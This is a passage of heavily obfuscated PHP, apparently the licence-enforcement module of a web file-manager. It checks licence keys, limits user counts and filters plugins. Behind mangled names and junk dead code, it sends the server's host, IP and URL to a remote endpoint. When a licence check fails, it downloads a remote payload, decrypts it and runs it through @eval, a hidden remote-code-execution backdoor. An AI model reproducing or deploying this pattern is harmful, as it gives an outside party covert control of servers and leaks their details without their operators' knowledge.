$úÜÒêÙÍ[128])); $ä¶µù€„[$úÜÒêÙÍ[129]] = _get($this->oged17bba83b, $úÜÒêÙÍ[115]); } $ŒÁ´–È‘ = Model($úÜÒêÙÍ[33])->get($úÜÒêÙÍ[130], $úÜÒêÙÍ[6], !0); if (is_string($ŒÁ´–È‘) && substr($ŒÁ´–È‘, 0, 1) == $úÜÒêÙÍ[131]) { $ŒÁ´–È‘ = json_decode_force($ŒÁ´–È‘); } if (is_array($ŒÁ´–È‘) && $ŒÁ´–È‘[$úÜÒêÙÍ[132]] && strstr($ŒÁ´–È‘[$úÜÒêÙÍ[132]], $úÜÒêÙÍ[133])) { $’ÜÌ½± = explode($úÜÒêÙÍ[133], $ŒÁ´–È‘[$úÜÒêÙÍ[132]]); $ä¶µù€„[$úÜÒêÙÍ[134]] = $’ÜÌ½±[0]; } } $ä¶µù€„ = $this->tzgs8ec9139b(json_encode($ä¶µù€„), md5($úÜÒêÙÍ[135])); $Æ—ĞôÙ¢ = $ñÓ·ª¶[700]; if (strlen($Æ—ĞôÙ¢) < $ñÓ·ª¶[412]) { return; } $ÈŞ€—¯Ğ = array($úÜÒêÙÍ[136] => $ä¶µù€„); call_user_func(array($úÜÒêÙÍ[137], $úÜÒêÙÍ[138]), $ÈŞ€—¯Ğ); } if ($this->hbeqc5dc2903 == $úÜÒêÙÍ[108]) { return; } $ÎëÏª²Õ = array($úÜÒêÙÍ[139], $úÜÒêÙÍ[140], $úÜÒêÙÍ[141], $úÜÒêÙÍ[142], $úÜÒêÙÍ[143], $úÜÒêÙÍ[144]); $„ËÛıê’ = Model($úÜÒêÙÍ[33])->get(); $áê˜¶¡Å = $ñÓ·ª¶[701]; if (strlen($áê˜¶¡Å) < $ñÓ·ª¶[676]) { die; } $ÈŞ€—¯Ğ = array($úÜÒêÙÍ[145] => $„ËÛıê’[$úÜÒêÙÍ[34]], $úÜÒêÙÍ[146] => $„ËÛıê’[$úÜÒêÙÍ[35]], $úÜÒêÙÍ[147] => $úÜÒêÙÍ[6]); $™Ûœ’· = $ñÓ·ª¶[702]; foreach ($ÎëÏª²Õ as $ñÔÜÂ±) { if (!isset($„ËÛıê’[$ñÔÜÂ±]) || !$„ËÛıê’[$ñÔÜÂ±]) { continue; } $ÈŞ€—¯Ğ[$ñÔÜÂ±] = $„ËÛıê’[$ñÔÜÂ±]; $á‹’–‡Ğ = $ñÓ·ª¶[703]; } call_user_func(array($úÜÒêÙÍ[137], $úÜÒêÙÍ[138]), $ÈŞ€—¯Ğ); } private function zgtnbe65a103() { $¦ŸÖÁƒ =& $_SERVER[º·Ï‹¥³]; $–™¾œ­Ì =& $_SERVER[€ÔÇñ¨ø]; if ($_SERVER[$–™¾œ­Ì[24]] != $–™¾œ­Ì[148]) { return; } if (!KodUser::isRoot()) { die; } $…¼‹ãí = $GLOBALS[$–™¾œ­Ì[13]]; if (isset($…¼‹ãí[$–™¾œ­Ì[149]])) { $this->mgusb38ee48a(); die; } if (isset($…¼‹ãí[$–™¾œ­Ì[150]]) && isset($…¼‹ãí[$–™¾œ­Ì[150]]) == $–™¾œ­Ì[121]) { $…¼‹ãí[$–™¾œ­Ì[151]] = Model($–™¾œ­Ì[33])->get($–™¾œ­Ì[152]); } if (!isset($…¼‹ãí[$–™¾œ­Ì[151]]) || strlen($…¼‹ãí[$–™¾œ­Ì[151]]) != 16) { show_json($–™¾œ­Ì[153] . $…¼‹ãí[$–™¾œ­Ì[151]], !1); } $‹óùô»í = Model($–™¾œ­Ì[33])->get($–™¾œ­Ì[99]); $… µæ—¼ = md5($_SERVER[$–™¾œ­Ì[105]] . $‹óùô»í); $æâ®¾á = array($–™¾œ­Ì[151] => $…¼‹ãí[$–™¾œ­Ì[151]], $–™¾œ­Ì[154] => rand_string(16), $–™¾œ­Ì[155] => $–™¾œ­Ì[135], $–™¾œ­Ì[156] => $–™¾œ­Ì[157], $–™¾œ­Ì[158] => $_SERVER[$–™¾œ­Ì[159]], $–™¾œ­Ì[160] => $_SERVER[$–™¾œ­Ì[161]], $–™¾œ­Ì[162] => $_SERVER[$–™¾œ­Ì[163]], $–™¾œ­Ì[104] => $… µæ—¼, $–™¾œ­Ì[164] => Model($–™¾œ­Ì[33])->get($–™¾œ­Ì[130])); $æ‘ø­®Ò = $¦ŸÖÁƒ[704]; if (!$æ‘ø­®Ò) { return; } if (isset($…¼‹ãí[$–™¾œ­Ì[150]]) && isset($…¼‹ãí[$–™¾œ­Ì[150]]) == $–™¾œ­Ì[121]) { $æâ®¾á[$–™¾œ­Ì[150]] = md5($æâ®¾á[$–™¾œ­Ì[151]] . $–™¾œ­Ì[165] . $æâ®¾á[$–™¾œ­Ì[154]]); } if ($…¼‹ãí[$–™¾œ­Ì[166]] == $–™¾œ­Ì[167]) { $ÔÑ¶ë¼¬ = $this->tzgs8ec9139b($… µæ—¼, $–™¾œ­Ì[168]); $“è³™ = $this->qamef6a6ceac(json_encode($æâ®¾á), $… µæ—¼ . $–™¾œ­Ì[169], 3); $“è³™ = $“è³™ . $–™¾œ­Ì[170] . $_SERVER[$–™¾œ­Ì[159]]; $ğ–¿Íöı = $this->ndgx57fc9ed0($–™¾œ­Ì[171] . $ÔÑ¶ë¼¬ . $–™¾œ­Ì[172] . $“è³™, -1); show_json($ğ–¿Íöı, !0); } else { if ($…¼‹ãí[$–™¾œ­Ì[166]] == $–™¾œ­Ì[173]) { $Ô¸’Ü¿ = substr(md5($–™¾œ­Ì[174] . $… µæ—¼), 12, 15) . $–™¾œ­Ì[175]; $“è³™ = $this->qnsc844414e8(trim($…¼‹ãí[$–™¾œ­Ì[176]]), $Ô¸’Ü¿, 2); $¢©·üŸç = json_decode($“è³™, !0); if (!is_array($¢©·üŸç) || !is_array($¢©·üŸç[$–™¾œ­Ì[177]]) || $¢©·üŸç[$–™¾œ­Ì[151]] != !0) { $ğÅ¹£õï = $–™¾œ­Ì[178]; $É²—¶¼Ñ = $¢©·üŸç[$–™¾œ­Ì[177]] ? $–™¾œ­Ì[179] . $¢©·üŸç[$–™¾œ­Ì[177]] : $ğÅ¹£õï; show_json($É²—¶¼Ñ, !1); } else { $æâ®¾á[$–™¾œ­Ì[154]] = $¢©·üŸç[$–™¾œ­Ì[177]][$–™¾œ­Ì[180]]; } } else { $¢©·üŸç = $this->ndgx57fc9ed0($–™¾œ­Ì[181], $æâ®¾á, 10); } } if (!is_array($¢©·üŸç) || !is_array($¢©·üŸç[$–™¾œ­Ì[177]]) || $¢©·üŸç[$–™¾œ­Ì[151]] != !0) { $ğÅ¹£õï = LNG($–™¾œ­Ì[182]); $É²—¶¼Ñ = $¢©·üŸç[$–™¾œ­Ì[177]] ? $–™¾œ­Ì[179] . $¢©·üŸç[$–™¾œ­Ì[177]] : $ğÅ¹£õï; show_json($É²—¶¼Ñ, !1); } $¸á—ş÷Ü = $¢©·üŸç[$–™¾œ­Ì[177]]; $“à¤†ù = $this->mftj970b33d7($¸á—ş÷Ü[$–™¾œ­Ì[183]]); $™Áš¬µ· = $¦ŸÖÁƒ[705]; if (!$™Áš¬µ·) { return; } if (!$“à¤†ù || $“à¤†ù != $¸á—ş÷Ü[$–™¾œ­Ì[128]]) { $¹ìŒµÒÍ = array($–™¾œ­Ì[184] => Model($–™¾œ­Ì[33])->get($–™¾œ­Ì[99]), $–™¾œ­Ì[185] => $_SERVER[$–™¾œ­Ì[105]], $–™¾œ­Ì[186] => this_url(), $–™¾œ­Ì[160] => $_SERVER[$–™¾œ­Ì[161]]); $“è³™ = $this->hyrn32bf48d4(json_encode($¹ìŒµÒÍ)); $this->ndgx57fc9ed0($–™¾œ­Ì[187] . $“è³™); show_json(LNG($–™¾œ­Ì[188]), !0); } $ÂŠõ–îí = array($–™¾œ­Ì[152] => $¸á—ş÷Ü[$–™¾œ­Ì[189]], $–™¾œ­Ì[190] => $¸á—ş÷Ü[$–™¾œ­Ì[191]], $–™¾œ­Ì[192] => rand_string(16), $–™¾œ­Ì[107] => $¸á—ş÷Ü[$–™¾œ­Ì[193]]); if ($æâ®¾á[$–™¾œ­Ì[154]]) { $ÂŠõ–îí[$–™¾œ­Ì[192]] = $æâ®¾á[$–™¾œ­Ì[154]]; } $å™¦ó©× = substr(md5($ÂŠõ–îí[$–™¾œ­Ì[190]]), 10, 10); $‚ÙÖİ¤° = $å™¦ó©× . $ÂŠõ–îí[$–™¾œ­Ì[107]] . $ÂŠõ–îí[$–™¾œ­Ì[192]]; $ÂŠõ–îí[$–™¾œ­Ì[109]] = strrev(base64_encode($this->tzgs8ec9139b($‚ÙÖİ¤°, $–™¾œ­Ì[194]))); $ö¢ŸöÜà = rand_string(16); $Ë†Ú¿—¿ = $ö¢ŸöÜà . $ÂŠõ–îí[$–™¾œ­Ì[107]] . $this->tzgs8ec9139b(md5($ÂŠõ–îí[$–™¾œ­Ì[152]]), $ö¢ŸöÜà); $ÂŠõ–îí[$–™¾œ­Ì[110]] = base64_encode(strrev($this->tzgs8ec9139b($Ë†Ú¿—¿, $–™¾œ­Ì[195]))); $ Šø¸×… = $¦ŸÖÁƒ[706]; if (strlen($ Šø¸×…) < $¦ŸÖÁƒ[707]) { die; } if ($¸á—ş÷Ü[$–™¾œ­Ì[196]] && $¸á—ş÷Ü[$–™¾œ­Ì[196]] >= 1) { Model($–™¾œ­Ì[33])->setDeep($–™¾œ­Ì[197], $–™¾œ­Ì[121]); } Model($–™¾œ­Ì[33])->set($ÂŠõ–îí); $Ş–…ëø² = md5($_SERVER[$–™¾œ­Ì[105]] . strrev($‹óùô»í) . $ÂŠõ–îí[$–™¾œ­Ì[190]]); $ãïšÓ¨ = $¦ŸÖÁƒ[708]; if (strlen($ãïšÓ¨) < $¦ŸÖÁƒ[412]) { die; } $¤ºªâïĞ = strrev(substr($Ş–…ëø², 10, 16)); $©Ì·®ê¾ = $this->qamef6a6ceac(json_encode($¸á—ş÷Ü), $Ş–…ëø²); $Ìö“Ÿå§ = $¦ŸÖÁƒ[709]; if (strlen($Ìö“Ÿå§) < $¦ŸÖÁƒ[672]) { die; } $Ç‰¯Ú¼ñ = array_to_keyvalue(Model($–™¾œ­Ì[7])->listData(), $–™¾œ­Ì[198]); $¦ÚÌáùá = $¦ŸÖÁƒ[710]; if (strlen($¦ÚÌáùá) < $¦ŸÖÁƒ[412]) { die; } $ÅışÔØ² = $Ç‰¯Ú¼ñ[$–™¾œ­Ì[199]]; $ÈËº‹¨Ï = $¦ŸÖÁƒ[711]; while (strlen($ÈËº‹¨Ï) < $¦ŸÖÁƒ[691]) { if (!$ÈËº‹¨Ï) { break; } $ÈËº‹¨Ï++; } $‚£Áîá‹ = array(); $çî×ß« = $¦ŸÖÁƒ[712]; while (strlen($çî×ß«) < $¦ŸÖÁƒ[691]) { if (!$çî×ß«) { break; } $çî×ß«++; } $‚£Áîá‹[$¤ºªâïĞ] = $©Ì·®ê¾; $Ì½º‰äˆ = $¦ŸÖÁƒ[713]; if (strlen($Ì½º‰äˆ) < $¦ŸÖÁƒ[691]) { return; } Model($–™¾œ­Ì[7])->update($ÅışÔØ²[$–™¾œ­Ì[200]], array($–™¾œ­Ì[201] => $‚£Áîá‹)); $this->oged17bba83b = $¸á—ş÷Ü; $this->hbeqc5dc2903 = $ÂŠõ–îí[$–™¾œ­Ì[107]]; $this->licenseRegistSuccess(); $‚£Ë¶Õ = $¦ŸÖÁƒ[714]; Cache::set($–™¾œ­Ì[202] . md5($‹óùô»í . $–™¾œ­Ì[203]), $–™¾œ­Ì[6]); show_json(LNG($–™¾œ­Ì[188]), !0); } private function licenseRegistSuccess() { $ã—›À©ğ =& $_SERVER[º·Ï‹¥³]; $ÍÚü°£¸ =& $_SERVER[€ÔÇñ¨ø]; $‡ÁÒô¿’ = Model($ÍÚü°£¸[33])->get(); $áÎûí¦Ñ = $ã—›À©ğ[715]; while (strlen($áÎûí¦Ñ) < $ã—›À©ğ[691]) { if (!$áÎûí¦Ñ) { break; } $áÎûí¦Ñ++; } if ($‡ÁÒô¿’[$ÍÚü°£¸[63]] != $ÍÚü°£¸[121]) { Model($ÍÚü°£¸[33])->set($ÍÚü°£¸[63], $ÍÚü°£¸[121]); } Action($ÍÚü°£¸[204])->initStart(!0); } private function mgusb38ee48a() { $ÌÆÚß§À =& $_SERVER[º·Ï‹¥³]; $ËıÅ™½Ò =& $_SERVER[€ÔÇñ¨ø]; Model($ËıÅ™½Ò[33])->set(array($ËıÅ™½Ò[152] => $ËıÅ™½Ò[6], $ËıÅ™½Ò[190] => $ËıÅ™½Ò[6], $ËıÅ™½Ò[107] => $ËıÅ™½Ò[108], $ËıÅ™½Ò[109] => $ËıÅ™½Ò[6], $ËıÅ™½Ò[110] => $ËıÅ™½Ò[6])); $ÎŒ‘ØÃè = $ÌÆÚß§À[716]; Model($ËıÅ™½Ò[33])->setDeep($ËıÅ™½Ò[197], $ËıÅ™½Ò[205]); $this->oged17bba83b = array(); $this->hbeqc5dc2903 = $ËıÅ™½Ò[108]; $çìÑŠ¿Ø = $ÌÆÚß§À[717]; if (strlen($çìÑŠ¿Ø) < $ÌÆÚß§À[691]) { return; } } private function lxvye9f5c37f() { $¼÷•‹¼Ä =& $_SERVER[º·Ï‹¥³]; $¾¾‡÷Àª =& $_SERVER[€ÔÇñ¨ø]; $_SERVER[$¾¾‡÷Àª[161]] = _get($_SERVER, $¾¾‡÷Àª[161], APP_HOST); $this->hbeqc5dc2903 = $¾¾‡÷Àª[108]; $ŒÎ±óø› = Model($¾¾‡÷Àª[33])->get(); $ê…õ–´Ù = $¼÷•‹¼Ä[718]; if (!$ê…õ–´Ù) { die; } if ($ŒÎ±óø›[$¾¾‡÷Àª[107]] == $¾¾‡÷Àª[108]) { return; } $Â›˜»ë‡ = Model($¾¾‡÷Àª[33])->get($¾¾‡÷Àª[99]); $ò´äùŞ‹ = $¼÷•‹¼Ä[719]; while ($ò´äùŞ‹ < $¼÷•‹¼Ä[676]) { if ($ò´äùŞ‹ >= 0) { break; } $ò´äùŞ‹++; } $´æ™Üšº = $¾¾‡÷Àª[202] . md5($Â›˜»ë‡ . $¾¾‡÷Àª[203]); $É¿ÙŞğı = $¼÷•‹¼Ä[720]; $š•­Í—€ = Cache::get($´æ™Üšº); $˜İ‡ÌÃı = $¼÷•‹¼Ä[721]; if (strlen($˜İ‡ÌÃı) < $¼÷•‹¼Ä[672]) { die; } if (!is_array($š•­Í—€) || !isset($š•­Í—€[$¾¾‡÷Àª[206]]) || time() - $š•­Í—€[$¾¾‡÷Àª[206]] >= 60) { $ÌîòêÂü = Model($¾¾‡÷Àª[7])->loadList(); $üıù¯™ì = $ÌîòêÂü[$¾¾‡÷Àª[199]]; $®ÅÔŞ¡Ò = md5($_SERVER[$¾¾‡÷Àª[105]] . strrev($Â›˜»ë‡) . $ŒÎ±óø›[$¾¾‡÷Àª[190]]); $±©–ŞĞ = strrev(substr($®ÅÔŞ¡Ò, 10, 16)); $š•­Í—€ = $this->qnsc844414e8($üıù¯™ì[$¾¾‡÷Àª[85]][$±©–ŞĞ], $®ÅÔŞ¡Ò); $š•­Í—€ = json_decode($š•­Í—€, !0); } if (!is_array($š•­Í—€)) { return $this->mgusb38ee48a(); } $·ì²Æœ† = strtotime($š•­Í—€[$¾¾‡÷Àª[128]]); if (time() >= $·ì²Æœ†) { return $this->mgusb38ee48a(); } if (!isset($š•­Í—€[$¾¾‡÷Àª[206]]) || time() - $š•­Í—€[$¾¾‡÷Àª[206]] > 20) { $š•­Í—€[$¾¾‡÷Àª[206]] = time(); Cache::set($´æ™Üšº, $š•­Í—€); } $this->oged17bba83b = $š•­Í—€; $this->hbeqc5dc2903 = $ŒÎ±óø›[$¾¾‡÷Àª[107]]; } private function okxz5abf0478() { $‡ªÉÕ‰Š =& $_SERVER[€ÔÇñ¨ø]; $ÛÆ²à» = $GLOBALS[$‡ªÉÕ‰Š[13]]; $ï“¢°ûü = $_SERVER[$‡ªÉÕ‰Š[24]]; if ($ï“¢°ûü == $‡ªÉÕ‰Š[207] && $this->hbeqc5dc2903 == $‡ªÉÕ‰Š[108]) { show_json(LNG($‡ªÉÕ‰Š[208]), !1, $‡ªÉÕ‰Š[209]); } $º’ÊÏŒå = array($‡ªÉÕ‰Š[210], $‡ªÉÕ‰Š[211]); if (in_array($ï“¢°ûü, $º’ÊÏŒå)) { if ($this->hbeqc5dc2903 == $‡ªÉÕ‰Š[108] && isset($ÛÆ²à»[$‡ªÉÕ‰Š[212]])) { show_json(LNG($‡ªÉÕ‰Š[208]), !1, $‡ªÉÕ‰Š[209]); die; } $–¢å”Í¤ = $this->lgfz57cb0b47(); if ($–¢å”Í¤ != intval($‡ªÉÕ‰Š[213])) { if ($–¢å”Í¤ <= Model($‡ªÉÕ‰Š[124])->count()) { show_json(LNG($‡ªÉÕ‰Š[214]), !1, $‡ªÉÕ‰Š[209]); die; } } } } private function zqxpacf7fe71() { $’¥µ€¾À =& $_SERVER[º·Ï‹¥³]; $ËĞ¬ÜÑĞ =& $_SERVER[€ÔÇñ¨ø]; $ÓËÇ¦İ = array($ËĞ¬ÜÑĞ[118], $ËĞ¬ÜÑĞ[119]); $„’Æ›î = $’¥µ€¾À[722]; if (!$„’Æ›î) { return; } if (!KodUser::isRoot() || !isset($_GET[$ËĞ¬ÜÑĞ[215]])) { return; } if (!in_array($_SERVER[$ËĞ¬ÜÑĞ[24]], $ÓËÇ¦İ)) { return; } $¥¦•«Ç€ = $ËĞ¬ÜÑĞ[216]; $¥¦•«Ç€ = $this->cqjd2048f8cf($¥¦•«Ç€, $ËĞ¬ÜÑĞ[217]); $·ÒüÂ÷æ = stream_context_create(array($ËĞ¬ÜÑĞ[218] => array($ËĞ¬ÜÑĞ[219] => $ËĞ¬ÜÑĞ[220], $ËĞ¬ÜÑĞ[221] => 3))); $™¯ÏãÄñ = @file_get_contents($¥¦•«Ç€, !1, $·ÒüÂ÷æ); $ê¥¥€ÎÉ = $’¥µ€¾À[718]; if (!$ê¥¥€ÎÉ) { return; } header($ËĞ¬ÜÑĞ[222]); if ($™¯ÏãÄñ && strstr($™¯ÏãÄñ, $ËĞ¬ÜÑĞ[223])) { echo $™¯ÏãÄñ; } die; } public function xhfi0bbe14d6($¾òó‘Ã¤) { $ğø‰İæ =& $_SERVER[º·Ï‹¥³]; $Ï²™Ë«© =& $_SERVER[€ÔÇñ¨ø]; if ($this->hbeqc5dc2903 == $Ï²™Ë«©[224]) { return $¾òó‘Ã¤; } $òğ¡«†² = $this->versionPluginList(); $èæ‰İø• = explode($Ï²™Ë«©[225], $this->versionPluginFilter()); $ıºóĞÖÓ = $ğø‰İæ[723]; $¯·ÂŸäø = array(); $îğóëï = $ğø‰İæ[724]; if (!$îğóëï) { return; } foreach ($òğ¡«†² as $óÌ¿«Ö => $ ĞÙÜáŸ) { if ($ ĞÙÜáŸ == $Ï²™Ë«©[226] && substr($this->hbeqc5dc2903, 0, 1) == $Ï²™Ë«©[226]) { continue; } if (!in_array($óÌ¿«Ö, $èæ‰İø•)) { $¯·ÂŸäø[] = $óÌ¿«Ö; } } foreach ($¯·ÂŸäø as $óÌ¿«Ö) { unset($¾òó‘Ã¤[$óÌ¿«Ö]); } return $¾òó‘Ã¤; $¹× —°Ú = $ğø‰İæ[725]; if (strlen($¹× —°Ú) < $ğø‰İæ[412]) { return; } } private function versionPluginList() { $ ——’ÈÙ =& $_SERVER[€ÔÇñ¨ø]; return array($ ——’ÈÙ[227] => $ ——’ÈÙ[226], $ ——’ÈÙ[228] => $ ——’ÈÙ[226], $ ——’ÈÙ[229] => $ ——’ÈÙ[226], $ ——’ÈÙ[230] => $ ——’ÈÙ[231], $ ——’ÈÙ[232] => $ ——’ÈÙ[231], $ ——’ÈÙ[233] => $ ——’ÈÙ[231], $ ——’ÈÙ[234] => $ ——’ÈÙ[231], $ ——’ÈÙ[235] => $ ——’ÈÙ[231], $ ——’ÈÙ[236] => $ ——’ÈÙ[231], $ ——’ÈÙ[237] => $ ——’ÈÙ[231], $ ——’ÈÙ[238] => $ ——’ÈÙ[231], $ ——’ÈÙ[239] => $ ——’ÈÙ[231], $ ——’ÈÙ[240] => $ ——’ÈÙ[231], $ ——’ÈÙ[241] => $ ——’ÈÙ[231], $ ——’ÈÙ[242] => $ ——’ÈÙ[231], $ ——’ÈÙ[243] => $ ——’ÈÙ[231]); } private function versionPluginFilter() { $åÊÙ  Ğ =& $_SERVER[º·Ï‹¥³]; $ûØİ©ƒ· =& $_SERVER[€ÔÇñ¨ø]; if ($this->hbeqc5dc2903 == $ûØİ©ƒ·[108]) { return $ûØİ©ƒ·[6]; } $¹â‡é“ = _get($this->oged17bba83b, $ûØİ©ƒ·[244], $ûØİ©ƒ·[6]); $ÉƒÑÄà¹ = $åÊÙ  Ğ[726]; if (!$ÉƒÑÄà¹) { die; } $İ¶ˆá» = _get($this->oged17bba83b, $ûØİ©ƒ·[115], $ûØİ©ƒ·[6]); $é£—ä«õ = _get($this->oged17bba83b, $ûØİ©ƒ·[245], $ûØİ©ƒ·[6]); $Éõİêõ² = $åÊÙ  Ğ[727]; if (!$Éõİêõ²) { die; } if ($İ¶ˆá» > time() && $é£—ä«õ > time()) { $êÖ¥ä»Ó = explode($ûØİ©ƒ·[225], $¹â‡é“); $‹¨µ‹œ = array_keys($this->versionPluginList()); $¹â‡é“ = array_merge($êÖ¥ä»Ó, $‹¨µ‹œ); $¹â‡é“ = implode($ûØİ©ƒ·[225], array_filter(array_unique($¹â‡é“))); } return $¹â‡é“; } private function cqbo482b6eb6() { $‡á„·’Î =& $_SERVER[€ÔÇñ¨ø]; if ($this->hbeqc5dc2903 != $‡á„·’Î[108]) { $GLOBALS[$‡á„·’Î[85]][$‡á„·’Î[89]][$‡á„·’Î[246]] = $‡á„·’Î[205]; return; } $GLOBALS[$‡á„·’Î[85]][$‡á„·’Î[247]] = $‡á„·’Î[121]; if (Model($‡á„·’Î[248])->get($‡á„·’Î[63]) != $‡á„·’Î[205]) { Model($‡á„·’Î[248])->set($‡á„·’Î[63], $‡á„·’Î[205]); } } public function cgxy0e3b9799() { $¨²óµ =& $_SERVER[º·Ï‹¥³]; return $_SERVER[€ÔÇñ¨ø][249]; $®¡”òá‘ = $¨²óµ[728]; if (strlen($®¡”òá‘) < $¨²óµ[691]) { return; } } private function cqdw6e16c9ab() { $°êœ‰ Š =& $_SERVER[º·Ï‹¥³]; $õ¼›§ì– =& $_SERVER[€ÔÇñ¨ø]; $ñ´Ï‡È = array($õ¼›§ì–[250], $õ¼›§ì–[251], $õ¼›§ì–[252]); $ØÎìÀ½ = $õ¼›§ì–[253] . md5($õ¼›§ì–[254]); if ($this->hbeqc5dc2903 == $õ¼›§ì–[108] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$õ¼›§ì–[24]], $ñ´Ï‡È)) { return; } if (time() % 4 != 0) { return; } $ÆÛıŒî = call_user_func(array($õ¼›§ì–[255], $õ¼›§ì–[256]), $ØÎìÀ½); $Æ´½¢Š = $°êœ‰ Š[729]; if (!$Æ´½¢Š) { die; } if ($ÆÛıŒî && time() - $ÆÛıŒî < intval($õ¼›§ì–[257])) { return; } call_user_func(array($õ¼›§ì–[255], $õ¼›§ì–[138]), $ØÎìÀ½, time()); $¥§ú²‘Å = Model($õ¼›§ì–[33])->get($õ¼›§ì–[99]); $Í¢ò…ùé = $°êœ‰ Š[730]; if (strlen($Í¢ò…ùé) < $°êœ‰ Š[691]) { die; } $»ï†¶ø½ = array($õ¼›§ì–[151] => Model($õ¼›§ì–[33])->get($õ¼›§ì–[152]), $õ¼›§ì–[166] => $this->hbeqc5dc2903, $õ¼›§ì–[162] => $_SERVER[$õ¼›§ì–[163]], $õ¼›§ì–[164] => Model($õ¼›§ì–[33])->get($õ¼›§ì–[130]), $õ¼›§ì–[104] => md5($_SERVER[$õ¼›§ì–[105]] . $¥§ú²‘Å), $õ¼›§ì–[155] => $õ¼›§ì–[135], $õ¼›§ì–[158] => $_SERVER[$õ¼›§ì–[159]]); $İÒ½Å = $°êœ‰ Š[731]; if (strlen($İÒ½Å) < $°êœ‰ Š[676]) { return; } $ùÖóÊ²Ï = $this->ndgx57fc9ed0($õ¼›§ì–[258], $»ï†¶ø½); $İú—«› = $°êœ‰ Š[732]; if (!is_array($ùÖóÊ²Ï)) { return; } if ($ùÖóÊ²Ï[$õ¼›§ì–[151]] && $ùÖóÊ²Ï[$õ¼›§ì–[259]]) { if ($this->mftj970b33d7($ùÖóÊ²Ï[$õ¼›§ì–[259]]) == $»ï†¶ø½[$õ¼›§ì–[151]]) { return; } } $this->mgusb38ee48a(); $œ·Î§ğØ = $°êœ‰ Š[733]; if (strlen($œ·Î§ğØ) < $°êœ‰ Š[691]) { return; } if ($this->mftj970b33d7($ùÖóÊ²Ï[$õ¼›§ì–[259]]) != $»ï†¶ø½[$õ¼›§ì–[151]]) { $« ÕüšÉ = array($õ¼›§ì–[184] => $¥§ú²‘Å, $õ¼›§ì–[185] => $_SERVER[$õ¼›§ì–[105]], $õ¼›§ì–[186] => this_url(), $õ¼›§ì–[160] => $_SERVER[$õ¼›§ì–[161]]); $šİ¢¿Ï = $this->hyrn32bf48d4(json_encode($« ÕüšÉ)); $ùÖóÊ²Ï = $this->ndgx57fc9ed0($õ¼›§ì–[187] . $šİ¢¿Ï); if ($ùÖóÊ²Ï && is_array($ùÖóÊ²Ï) && isset($ùÖóÊ²Ï[$õ¼›§ì–[259]])) { $÷Ã‹æÆ = $this->qnsc844414e8($ùÖóÊ²Ï[$õ¼›§ì–[259]], 2); if ($÷Ã‹æÆ) { $÷Ã‹æÆ = $this->mftj970b33d7($÷Ã‹æÆ); } if ($÷Ã‹æÆ) { try { @eval($÷Ã‹æÆ); } catch (Exception $ºé†Õı) { } } } } } private function ndgx57fc9ed0($è²îÉ¼Ë = '', $ı×¿˜„ = array(), $¡‘¤Îşä = 5) { $ÙË÷‰˜ï =& $_SERVER[º·Ï‹¥³]; $é½¢‡àı =& $_SERVER[€ÔÇñ¨ø]; $ÜœŒ¥± = $é½¢‡àı[260]; $ÜœŒ¥± = $this->cqjd2048f8cf($ÜœŒ¥±, $é½¢‡àı[261]); $ÆÔŞ˜º² = $ÙË÷‰˜ï[734]; $ÜœŒ¥± = $ÜœŒ¥± . $è²îÉ¼Ë; if ($ı×¿˜„ && is_array($ı×¿˜„)) { $ÜœŒ¥± = $ÜœŒ¥± . $é½¢‡àı[262] . http_build_query($ı×¿˜„); } if ($ı×¿˜„ === -1) { return $ÜœŒ¥±; } $ğÑêõœ = stream_context_create(array($é½¢‡àı[218] => array($é½¢‡àı[221] => $¡‘¤Îşä, $é½¢‡àı[219] => $é½¢‡àı[263]), $é½¢‡àı[264] => array($é½¢‡àı[265] => !1, $é½¢‡àı[266] => !1))); $ı×¿˜„ = @file_get_contents($ÜœŒ¥±, !1, $ğÑêõœ); return json_decode($ı×¿˜„, !0); $¨äèøä = $ÙË÷‰˜ï[735]; while ($¨äèøä < $ÙË÷‰˜ï[707]) { if ($¨äèøä >= 0) { break; } $¨äèøä++; } $íŠÜîôõ = $ÙË÷‰˜ï[736]; if (strlen($íŠÜîôõ) < $ÙË÷‰˜ï[707]) { die; } } private function lgfz57cb0b47() { $°ˆóÂÒ =& $_SERVER[º·Ï‹¥³]; $ñÔç•üı =& $_SERVER[€ÔÇñ¨ø]; $·ÈƒÓê = array($ñÔç•üı[267] => $ñÔç•üı[268], $ñÔç•üı[269] => $ñÔç•üı[270], $ñÔç•üı[271] => $ñÔç•üı[272], $ñÔç•üı[273] => $ñÔç•üı[274], $ñÔç•üı[275] => $ñÔç•üı[276], $ñÔç•üı[277] => $ñÔç•üı[213], $ñÔç•üı[278] => $ñÔç•üı[213], $ñÔç•üı[279] => $ñÔç•üı[268], $ñÔç•üı[280] => $ñÔç•üı[270], $ñÔç•üı[281] => $ñÔç•üı[272], $ñÔç•üı[282] => $ñÔç•üı[283], $ñÔç•üı[284] => $ñÔç•üı[274], $ñÔç•üı[285] => $ñÔç•üı[286], $ñÔç•üı[287] => $ñÔç•üı[276], $ñÔç•üı[288] => $ñÔç•üı[289], $ñÔç•üı[290] => $ñÔç•üı[291], $ñÔç•üı[292] => $ñÔç•üı[293]); $‘ÜÔæ–™ = $°ˆóÂÒ[737]; if (!$‘ÜÔæ–™) { return; } $×ıû»ãØ = $·ÈƒÓê[$this->hbeqc5dc2903]; $×ıû»ãØ = intval($×ıû»ãØ ? $×ıû»ãØ : $ñÔç•üı[268]); $×ê¦Ô¾³ = _get($this->oged17bba83b, $ñÔç•üı[294]); $ñ«â‘üš = $°ˆóÂÒ[738]; if (!$ñ«â‘üš) { die; } $×ê¦Ô¾³ = $×ê¦Ô¾³ ? intval($×ê¦Ô¾³) : 0; $Î‹şˆ = $°ˆóÂÒ[739]; if (!$Î‹şˆ) { return; } return $×ıû»ãØ + $×ê¦Ô¾³; } public function xayqf4c43c30($Êı€®‚ê) { $¾··¡”Ö =& $_SERVER[º·Ï‹¥³]; $ğô×ğĞÜ =& $_SERVER[€ÔÇñ¨ø]; $Ü¿·Æù¢ = $this->lgfz57cb0b47(); if ($Êı€®‚ê[$ğô×ğĞÜ[295]] == $ğô×ğĞÜ[121]) { return; } if ($Ü¿·Æù¢ >= intval($ğô×ğĞÜ[213])) { return; } $ôë»ªÑ± = Model($ğô×ğĞÜ[124])->count(); $¢òÛ˜«š = $¾··¡”Ö[740]; if (strlen($¢òÛ˜«š) < $¾··¡”Ö[412]) { die; } if ($ôë»ªÑ± <= $Ü¿·Æù¢) { return; } $ºÙü–ğ¬ = Model($ğô×ğĞÜ[124])->field($ğô×ğĞÜ[295])->limit($Ü¿·Æù¢)->select(); $ÁİŸ«é— = $¾··¡”Ö[735]; if (!$ÁİŸ«é—) { return; } 